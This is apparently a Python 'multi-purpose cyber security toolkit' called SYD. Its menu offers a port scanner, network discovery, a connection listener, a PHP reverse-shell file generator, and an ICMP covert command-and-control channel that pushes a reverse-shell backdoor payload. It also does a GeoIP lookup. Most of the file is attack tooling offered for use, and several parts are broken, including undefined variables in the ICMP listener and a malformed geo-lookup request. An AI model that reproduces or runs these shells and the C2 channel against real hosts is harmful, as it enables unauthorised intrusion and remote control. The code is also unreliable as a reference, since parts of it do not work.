from termcolor import colored
from scapy.all import *
import socket
import threading
import time
import subprocess
import re
import os
import platform
import signal
import requests


def print_syd_logo():
    logo = [
        "░▒▓███████▓▒ ░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░  ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ ",
        " ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "       ░▒▓█▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░ ",
        "░▒▓███████▓▒░   ░▒▓█▓▒░   ░▒▓███████▓▒░  "
    ]
    for line in logo:
        print(colored(line, 'red', attrs=['bold']))
        time.sleep(0.1)

def print_welcome_message():
    print(colored("\nWelcome to SYD - Multi-Purpose Cyber Security Tool Kit", 'green', attrs=['bold']))
    print(colored("Developed by SydRa aka Sacit \n", 'light_green'))

def validate_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    if pattern.match(ip):
        return ip
    print(colored("[!] Invalid IP Address! Try Again.", "red"))
    return validate_ip(input(colored("Enter Target IP Address: ", "cyan")))

def validate_port(port):
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
    except ValueError:
        pass
    print(colored("[!] Invalid Port! Try Again.", "red"))
    return validate_port(input(colored("Enter Target Port (1-65535): ", "cyan")))

def scan_port(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    conn = s.connect_ex((ip, port))
    if conn == 0:
        print(colored(f"[+] {ip}:{port} Open", "green"))
    s.close()

def port_scanner(ip):
    print(colored(f"\nScanning... {ip} (1-65535)\n", "yellow"))
    thread_list = []
    try:
        for port in range(1, 65536):
            thread = threading.Thread(target=scan_port, args=(ip, port))
            thread_list.append(thread)
            thread.start()

            if len(thread_list) >= 100:
                for t in thread_list:
                    t.join()
                thread_list = []

    except KeyboardInterrupt:
        print(colored("\nScanning process aborted! Returning to Menu...\n", "red"))
        main_menu()

def port_listener():
    host = "0.0.0.0"
    port = validate_port(input(colored("Which Port You Want To Listen? (1-65536) : ", "cyan")))

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    server.settimeout(1)  

    print(colored(f"\n[+] Listening on Port {port} ... (Press Ctrl+C to return to menu)", "yellow"))

    try:
        while True:
            try:
                client_socket, client_address = server.accept()
                print(colored(f"\n[+] Connection Confirmed: {client_address[0]}:{client_address[1]}", "green"))
                break  
            except socket.timeout:
                continue  
    except KeyboardInterrupt:
        print(colored("\n[!] No connection received. Returning to the Menu...", "red"))
        server.close()
        main_menu()
        return  
    
    try:
        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(colored(f"[CLIENT]: {data}", "cyan"))
            message = input(colored("[YOU]: ", "magenta"))
            client_socket.send(message.encode())
    except KeyboardInterrupt:
        print(colored("\n[!] Connection closed. Returning to the Menu...", "red"))
    finally:
        server.close()
        main_menu()

def generate_php_reverse_shell():
    lhost = validate_ip(input(colored("Enter Your Attack Ip Address (LHOST): ", "cyan")))
    lport = validate_port(input(colored("Enter Your Attack Port (LPORT): ", "cyan")))

    try:
        php_shell = f'''<?php
        $sock = fsockopen("{lhost}", {lport});
        $proc = proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
        ?>'''

        filename = "reverse_shell.php"
        with open(filename, "w") as file:
            file.write(php_shell)

        print(colored(f"[+] PHP Reverse Shell file created as '{filename}'", "green"))
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))

def get_local_ip():
    try:
        if platform.system() == "Windows":
            result = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
            match = re.search(r"IPv4 Address.*? (\d+\.\d+\.\d+\.\d+)", result)
            return match.group(1) if match else None
        else:
            result = subprocess.check_output("ip addr show", shell=True, encoding="utf-8", errors="ignore")
            match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/\d+", result)
            return match.group(1) if match else None
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))
        return None

def discover_network():
    local_ip = get_local_ip()
    if local_ip is None:
        print("Local IP Address Could Not Be Found.")
        return

    print(f"Local IP: {local_ip}")

    try:
        result = subprocess.check_output("arp -a", shell=True, encoding="utf-8")
        print(result)
    except Exception as e:
        print(colored(f"[!] Error: {e}", "red"))

ICMP_ID = 13170

def send_icmp_request(dst_ip, command):
    pkt = IP(dst=dst_ip) / ICMP(type=8, id=ICMP_ID) / command.encode()
    send(pkt, verbose=False)

def send_icmp_reply(dst_ip, response):
    pkt = IP(dst=dst_ip) / ICMP(type=0, id=ICMP_ID) / response.encode()
    send(pkt, verbose=False)

def listen_for_icmp_response():
    def process_packet(packet):
        if packet.haslayer(ICMP):
            icmp_layer = packet.getlayer(ICMP)
            if icmp_layer.type == 0 and icmp_layer.id == ICMP_ID:
                command_output = bytes(icmp_layer.payload).decode(errors="ignore")
                print(colored(f"[+] Received Response: {command_output}", "green"))
    sniff(filter="icmp", prn=process_packet, store=0)

def icmp_shell(dst_ip):
    threading.Thread(target=listen_for_icmp_response, daemon=True).start()
    while True:
        command = input("[SYD_C2] Enter command (or type 'exit' to return): ")
        if command.strip().lower() == "exit":
            break
        send_icmp_request(dst_ip, command)

def start_icmp_shell():
    target_ip = validate_ip(input(colored("Enter Target IP Address: ", "cyan")))
    icmp_shell(target_ip)

def icmp_listener():
    def process_packet(packet):
        if packet.haslayer(ICMP):
            icmp_layer = packet.getlayer(ICMP)
            if icmp_layer.type == 8 and icmp_layer.id == ICMP_ID:
                command = bytes(icmp_layer.payload).decode(errors="ignore")
                print(colored(f"[+] Received Command: {command}", "cyan"))

                if command.lower() == "backdoor":
                    reverse_shell_payload = f"""<?php
                    $sock=fsockopen("{lhost}", {lport});
                    $proc=proc_open("/bin/sh", array(0=>$sock,1=>$sock,2=>$sock),$pipes);
                    ?>"""
                    send_icmp_reply(packet[IP].src, reverse_shell_payload)
                    print(colored("[+] Backdoor Payload Sent", "green"))
                else:
                    output = f"Unknown command: {command}"
                    send_icmp_reply(packet[IP].src, output)

    print("[+] ICMP C2 Listener started!")
    sniff(filter="icmp", prn=process_packet, store=0)

def get_geo_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}/json"
        response = requests.get(url)
        data = response.json()

        if "error" in data:
            print(colored(f"[!] Error: {data["error"]["message"]}", "red"))

        city = data.get('city', 'N/A')
        region = data.get('region', 'N/A')
        country = data.get('country', 'N/A')
        loc = data.get('loc', 'N/A').split(',')
        latitude = loc[0] if loc != 'N/A' else 'N/A'
        longitude = loc[1] if loc != 'N/A' else 'N/A'

        print(colored(f"\n[+] Geo Information for IP: {ip}", "green"))
        print(colored(f"City: {city}", "yellow"))
        print(colored(f"Region: {region}", "yellow"))
        print(colored(f"Country: {country}", "yellow"))
        print(colored(f"Latitude: {latitude}", "yellow"))
        print(colored(f"Longitude: {longitude}", "yellow"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Error: {e}", 'red'))

def main_menu():
    while True:
        print(colored("\n[ SYD - Cyber Security Tools ]", "cyan", attrs=["bold"]))
        print(colored("\n [OSINT Tools]", "purple", attrs=["bold"]))
        print(colored("1 - Port Scanner", "green"))
        print(colored("2 - SYDNetDiscovery", "green"))
        print(colored("3 - TCP Port Listener", "yellow"))
        print(colored("4 - PHP Reverse Shell Generator", "yellow"))
        print(colored("5 - SYD_ICMP_C2_Listener (Backdoor)", "red"))
        print(colored("6 - SYD_ICMP_C2_Client (Command Shell)", "red"))
        print(colored("7 - GeoIP Locator (Using ip-info API)"))
        print(colored("0 - Exit", "light_red"))

        choice = input(colored("\nSelect a Tool: ", "cyan"))
        if choice == "1":
            port_scanner(validate_ip(input(colored("Target IP Address: ", "cyan"))))
        elif choice == "2":
            discover_network()
        elif choice == "3":
            port_listener()
        elif choice == "4":
            generate_php_reverse_shell()
        elif choice == "5":
            icmp_listener()
        elif choice == "6":
            start_icmp_shell()
        elif choice == "7":
            ip = validate_ip(input(colored("Enter IP Address to Get Geo Info: ", "cyan")))
            get_geo_info(ip)
        elif choice == "0":
            break
        else:
            print(colored("[!] Invalid Number, Try Again.", "red"))
            main_menu()

if __name__ == "__main__":
    print_syd_logo()
    print_welcome_message()
    main_menu()
